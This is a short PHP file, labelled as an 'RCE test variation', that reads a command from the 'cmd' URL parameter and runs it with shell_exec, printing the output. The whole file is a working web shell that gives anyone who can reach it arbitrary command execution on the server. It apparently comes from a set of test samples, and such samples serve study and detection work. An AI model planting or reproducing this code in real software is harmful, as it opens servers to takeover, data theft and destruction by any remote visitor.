<?php
// RCE test variation #961
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>